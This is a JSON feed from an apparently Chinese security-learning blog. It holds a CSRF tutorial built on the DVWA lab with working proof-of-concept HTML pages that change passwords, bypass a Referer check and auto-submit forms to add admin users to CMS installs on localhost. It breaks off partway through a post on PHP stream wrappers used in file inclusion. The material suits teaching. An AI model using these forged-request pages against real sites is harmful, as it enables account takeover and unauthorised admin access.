{
    "version": "https://jsonfeed.org/version/1",
    "title": "My Violet Eva Garden",
    "description": "",
    "home_page_url": "https://kiyomijin.github.io",
    "items": [
        {
            "id": "https://kiyomijin.github.io/2022/10/21/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/CSRF%E5%8E%9F%E7%90%86%E5%8F%8A%E4%BD%93%E9%AA%8C/",
            "url": "https://kiyomijin.github.io/2022/10/21/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/CSRF%E5%8E%9F%E7%90%86%E5%8F%8A%E4%BD%93%E9%AA%8C/",
            "title": "CSRF原理及体验",
            "date_published": "2022-10-20T18:22:48.000Z",
            "content_html": "<h1 id=\"csrf原理及体验\"><a class=\"markdownIt-Anchor\" href=\"#csrf原理及体验\">#</a> CSRF 原理及体验</h1>\n<p><code>CSRF</code>  的全称是 <code>Cross-site request forgery</code> ，即跨站请求伪造。<br>\n<strong>定义为</strong>：攻击者在一定的攻击条件下，利用被攻向服务器发起请求，服务器可以正常解析并返回正确结果。</p>\n<p><img src=\"image-20221021000820032.png\" alt=\"image-20221021000820032\"></p>\n<blockquote>\n<p>被攻击者在【网站 A】处于登陆状态<br>\n必需要在【网站 A】同浏览器中打开黑客提供的链接<br>\n后台身份验证不严格（例如除 cookie 外无其他验证）</p>\n</blockquote>\n<p>那么， <code>CSRF</code>  能做什么事情呢？</p>\n<ul>\n<li>发邮件</li>\n<li>发消息</li>\n<li>财产操作比如转账，或者购买商品</li>\n<li>修改密码</li>\n<li>删除文章</li>\n</ul>\n<h1 id=\"csrf防御\"><a class=\"markdownIt-Anchor\" href=\"#csrf防御\">#</a> CSRF 防御</h1>\n<p><img src=\"image-20221021001447634.png\" alt=\"image-20221021001447634\"></p>\n<h1 id=\"csrf初体验\"><a class=\"markdownIt-Anchor\" href=\"#csrf初体验\">#</a> CSRF 初体验</h1>\n<p>我们使用 <code>Low</code>  安全等级</p>\n<p><img src=\"image-20221021004134735.png\" alt=\"image-20221021004134735\"></p>\n<p>在重置密码这里输入 <code>123456</code> 、 <code>123456</code></p>\n<p>照常理，理应在后台存储新密码成功后，我们下次登录是使用 <code>123456</code>  来登录</p>\n<p>在此时我们新起一个虚拟主机，将此段代码弄成一个 <code>html</code></p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">  <span class=\"comment\">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>CSRF<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t<span class=\"keyword\">function</span> <span class=\"title function_\">abc</span>(<span class=\"params\"></span>)&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t<span class=\"keyword\">var</span> im = <span class=\"keyword\">new</span> <span class=\"title class_\">Image</span>();</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\tim.<span class=\"property\">src</span> =  <span class=\"string\">&quot;http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=1234567&amp;password_conf=1234567&amp;Change=Change#&quot;</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;timg.jpeg&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;100%&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;100%&quot;</span> <span class=\"attr\">onclick</span>=<span class=\"string\">&quot;abc()&quot;</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>可以看到这段代码的原理是：</p>\n<p>在 <code>timg.jpeg</code>  这张铺满整个屏幕的图片上，设置了一个 <code>onclick</code>  事件，当点击时会调用 <code>abc()</code>  函数。</p>\n<p><code>abc</code>  函数主要是利用点击图片时利用 <code>html</code>  解析图片的 <code>src</code>  过程而发起了一个请求</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=1234567&amp;password_conf=1234567&amp;Change=Change#&quot;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221021004955949.png\" alt=\"image-20221021004955949\"></p>\n<p>使得刚刚用户修改的密码，变成了新的 <code>1234567</code></p>\n<p>因此，我们如果使用 <code>123456</code>  登录，势必会登录失败</p>\n<p><img src=\"image-20221021004042743.png\" alt=\"image-20221021004042743\"></p>\n<p>当我们使用 <code>1234567</code>  来登录时，是成功的，这样一来就完成了 <code>CSRF</code>  跨站伪造攻击。</p>\n<p>我们查看源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">\t<span class=\"comment\">// Get input</span></span><br><span class=\"line\">\t<span class=\"variable\">$pass_new</span>  = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;password_new&#x27;</span> ];</span><br><span class=\"line\">\t<span class=\"variable\">$pass_conf</span> = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;password_conf&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// Do the passwords match?</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>( <span class=\"variable\">$pass_new</span> == <span class=\"variable\">$pass_conf</span> ) &#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">// They do!</span></span><br><span class=\"line\">\t\t<span class=\"variable\">$pass_new</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class=\"title function_ invoke__\">is_object</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? <span class=\"title function_ invoke__\">mysqli_real_escape_string</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$pass_new</span> ) : ((<span class=\"title function_ invoke__\">trigger_error</span>(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\">\t\t<span class=\"variable\">$pass_new</span> = <span class=\"title function_ invoke__\">md5</span>( <span class=\"variable\">$pass_new</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">// Update the database</span></span><br><span class=\"line\">\t\t<span class=\"variable\">$insert</span> = <span class=\"string\">&quot;UPDATE `users` SET password = &#x27;<span class=\"subst\">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class=\"title function_ invoke__\">dvwaCurrentUser</span>() . <span class=\"string\">&quot;&#x27;;&quot;</span>;</span><br><span class=\"line\">\t\t<span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysqli_query</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$insert</span> ) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>( <span class=\"string\">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class=\"title function_ invoke__\">is_object</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? <span class=\"title function_ invoke__\">mysqli_error</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) : ((<span class=\"variable\">$___mysqli_res</span> = <span class=\"title function_ invoke__\">mysqli_connect_error</span>()) ? <span class=\"variable\">$___mysqli_res</span> : <span class=\"literal\">false</span>)) . <span class=\"string\">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">// Feedback for the user</span></span><br><span class=\"line\">\t\t<span class=\"variable\">$html</span> .= <span class=\"string\">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">// Issue with passwords matching</span></span><br><span class=\"line\">\t\t<span class=\"variable\">$html</span> .= <span class=\"string\">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t((<span class=\"title function_ invoke__\">is_null</span>(<span class=\"variable\">$___mysqli_res</span> = <span class=\"title function_ invoke__\">mysqli_close</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]))) ? <span class=\"literal\">false</span> : <span class=\"variable\">$___mysqli_res</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>可以看到，整个代码都是在对 <code>MYSQL</code>  进行修改操作，在密码的获取上没有做任何的<strong>来源验证</strong></p>\n<p>因此黑客可以使用同一个浏览器伪造请求来完成 <code>CSRF</code>  攻击</p>\n<h1 id=\"csrf-referer校验绕过\"><a class=\"markdownIt-Anchor\" href=\"#csrf-referer校验绕过\">#</a> CSRF Referer 校验绕过</h1>\n<p>题目是 <code>DVWA-Medium</code>  的 <code>CSRF</code></p>\n<p>我们直接来看一下源码是怎么增加保护的：</p>\n<p><img src=\"image-20221021010151443.png\" alt=\"image-20221021010151443\"></p>\n<p>想法挺好，但是依旧不够安全。</p>\n<p><strong>绕过思路</strong>：只要 <code>Referer</code>  里构造好黑客的 <code>1234567</code>  新密码请求后，添加上源服务器名就好了。</p>\n<p>我们首先尝试一下抓取点击图片触发的请求：</p>\n<p><img src=\"image-20221021010600349.png\" alt=\"image-20221021010600349\"></p>\n<p>这里的 Referer 会被后台的条件过滤掉，没法通过，原因在于整个字符串中没有源服务器名</p>\n<p><strong>注意</strong>：这里假设源服务器已经使用了另外的域名</p>\n<p><strong>那么我们可以把黑客的 html 命名为源服务器名，这样就可以过条件</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Referer: http://127.0.0.1/threezh1/csrf/127.0.0.1.html</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221021010912169.png\" alt=\"image-20221021010912169\"></p>\n<p><code>Password Changed！</code>  可以使用 <code>1234567</code>  登录</p>\n<p>附上代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">  <span class=\"comment\">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>CSRF<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t<span class=\"keyword\">function</span> <span class=\"title function_\">abc</span>(<span class=\"params\"></span>)&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t<span class=\"keyword\">var</span> im = <span class=\"keyword\">new</span> <span class=\"title class_\">Image</span>();</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\tim.<span class=\"property\">src</span> =  <span class=\"string\">&quot;http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=1234567&amp;password_conf=1234567&amp;Change=Change#&quot;</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;timg.jpeg&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;100%&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;100%&quot;</span> <span class=\"attr\">onclick</span>=<span class=\"string\">&quot;abc()&quot;</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"csrf-post请求绕过\"><a class=\"markdownIt-Anchor\" href=\"#csrf-post请求绕过\">#</a> CSRF POST 请求绕过</h1>\n<p>请求抓包</p>\n<p><img src=\"image-20221021022012970.png\" alt=\"image-20221021022012970\"></p>\n<p>发现 do 参数的值是 <code>add_confirm</code></p>\n<p><img src=\"image-20221021020531959.png\" alt=\"image-20221021020531959\"></p>\n<p>我们查看一下源码</p>\n<p><img src=\"image-20221021020803462.png\" alt=\"image-20221021020803462\"></p>\n<p>发现只是 <code>SQL</code>  语句的执行并提取相应的字段进行插入</p>\n<p>并未对 <code>CSRF</code>  的漏洞点做校验，因此可以攻击。</p>\n<p>当我们成功在一个浏览器中访问后</p>\n<p><img src=\"image-20221021015609544.png\" alt=\"image-20221021015609544\"></p>\n<p>我们使用如下代码生成的 html 页面进行绕过：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>CSRF<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t<span class=\"keyword\">function</span> <span class=\"title function_\">abc</span>(<span class=\"params\"></span>)&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t<span class=\"keyword\">var</span> f=<span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;test&quot;</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\tf.<span class=\"title function_\">submit</span>();</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span> <span class=\"attr\">onload</span>=<span class=\"string\">&quot;abc()&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;http://127.0.0.1/igaming/admin/users.php?do=add_confirm&quot;</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;test&quot;</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;POST&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;pseudo&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;hack&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;email&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;hack@gmail.com&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;fname&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;hack&#x27;&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;lname&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;hack&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;password&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;123456&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>原理是：</p>\n<p>使用 <code>onload</code>  事件当页面访问时就进行 <code>form</code>  表单提交</p>\n<p>其中 <code>form</code>  表单的 <code>action</code>  就是直接发起一个请求，请求的内容使用<strong> BP 抓包获取值</strong>进行自定义修改成 <code>input</code>  标签使用</p>\n<p><img src=\"image-20221021020354290.png\" alt=\"image-20221021020354290\"></p>\n<p>另一个题目的解法，也是一样的原理</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">  <span class=\"comment\">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>CSRF<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t<span class=\"keyword\">function</span> <span class=\"title function_\">abc</span>(<span class=\"params\"></span>)&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t<span class=\"keyword\">var</span> f=<span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;test&quot;</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\tf.<span class=\"title function_\">submit</span>();</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span> <span class=\"attr\">onload</span>=<span class=\"string\">&quot;abc()&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;http://127.0.0.1/espcms/adminsoft/index.php?archive=management&amp;action=managesava&quot;</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;POST&quot;</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;test&quot;</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;inputclass&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;add&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;tab&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;true&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;username&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;zhong1&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;password&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;zhongzhong1&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;password2&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;zhongzhong1&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;name&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;zhong1&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;sex&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;1&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;powergroup&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;1&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;inputclassid&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;1&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;isremote&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;1&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "CSRF跨站请求伪造"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8E%A2%E7%A9%B6/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E9%98%B6%EF%BC%88%E4%BA%8C%EF%BC%89/",
            "url": "https://kiyomijin.github.io/2022/10/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8E%A2%E7%A9%B6/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E9%98%B6%EF%BC%88%E4%BA%8C%EF%BC%89/",
            "title": "文件包含进阶（二）",
            "date_published": "2022-10-20T15:55:08.000Z",
            "content_html": "<h1 id=\"文件包含进阶二\"><a class=\"markdownIt-Anchor\" href=\"#文件包含进阶二\">#</a> 文件包含进阶（二）</h1>\n<p>本篇讲述伪协议相关内容</p>\n<h1 id=\"php伪协议php\"><a class=\"markdownIt-Anchor\" href=\"#php伪协议php\">#</a> php 伪协议 php://</h1>\n<p>php:// — 访问各个输入 / 输出流（I/O streams）</p>\n<h2 id=\"说明\"><a class=\"markdownIt-Anchor\" href=\"#说明\">#</a> 说明</h2>\n<p>PHP 提供了一些杂项输入 / 输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>\n<h3 id=\"phpstdin-phpstdout-和-phpstderr\"><a class=\"markdownIt-Anchor\" href=\"#phpstdin-phpstdout-和-phpstderr\">#</a> php://stdin, php://stdout 和 php://stderr</h3>\n<p>php://stdin、php://stdout 和 php://stderr 允许直接访问 PHP 进程相应的输入或者输出流。 数据流引用了复制的文件描述符，所以如果你打开 php://stdin 并在之后关了它， 仅是关闭了复制品，真正被引用的 <strong> <code>STDIN</code> </strong> 并不受影响。 推荐你简单使用常量 <strong> <code>STDIN</code> </strong>、 <strong> <code>STDOUT</code> </strong> 和 <strong> <code>STDERR</code> </strong> 来代替手工打开这些封装器。</p>\n<p>php://stdin 是只读的， php://stdout 和 php://stderr 是只写的。</p>\n<h3 id=\"phpinput\"><a class=\"markdownIt-Anchor\" href=\"#phpinput\">#</a> php://input</h3>\n<p>php://input 是个可以访问请求的原始数据的只读流。  <code>enctype=&quot;multipart/form-data&quot;</code>  的时候 php://input 是无效的。</p>\n<h3 id=\"phpoutput\"><a class=\"markdownIt-Anchor\" href=\"#phpoutput\">#</a> php://output</h3>\n<p>php://output 是一个只写的数据流， 允许你以 <a href=\"https://www.php.net/manual/zh/function.print.php\">print</a> 和 <a href=\"https://www.php.net/manual/zh/function.echo.php\">echo</a> 一样的方式 写入到输出缓冲区。</p>\n<h3 id=\"phpfd\"><a class=\"markdownIt-Anchor\" href=\"#phpfd\">#</a> php://fd</h3>\n<p>php://fd 允许直接访问指定的文件描述符。 例如 php://fd/3 引用了文件描述符 3。</p>\n<h3 id=\"phpmemory-和-phptemp\"><a class=\"markdownIt-Anchor\" href=\"#phpmemory-和-phptemp\">#</a> php://memory 和 php://temp</h3>\n<p>php://memory 和 php://temp 是一个类似文件 包装器的数据流，允许读写临时数据。 两者的唯一区别是 php://memory 总是把数据储存在内存中， 而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。 临时文件位置的决定和 <a href=\"https://www.php.net/manual/zh/function.sys-get-temp-dir.php\">sys_get_temp_dir()</a> 的方式一致。</p>\n<p>php://temp 的内存限制可通过添加  <code>/maxmemory:NN</code>  来控制， <code>NN</code>  是以字节为单位、保留在内存的最大数据量，超过则使用临时文件。</p>\n<h3 id=\"phpfilter\"><a class=\"markdownIt-Anchor\" href=\"#phpfilter\">#</a> php://filter</h3>\n<p>php://filter 是一种元封装器， 设计用于数据流打开时的<a href=\"https://www.php.net/manual/zh/filters.php\">筛选过滤</a>应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 <a href=\"https://www.php.net/manual/zh/function.readfile.php\">readfile()</a>、 <a href=\"https://www.php.net/manual/zh/function.file.php\">file()</a> 和 <a href=\"https://www.php.net/manual/zh/function.file-get-contents.php\">file_get_contents()</a>， 在 <code>数据流内容读取</code> 之前没有机会应用其他过滤器。</p>\n<p>php://filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。</p>\n<p><strong>php://filter 参数</strong></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">名称</th>\n<th 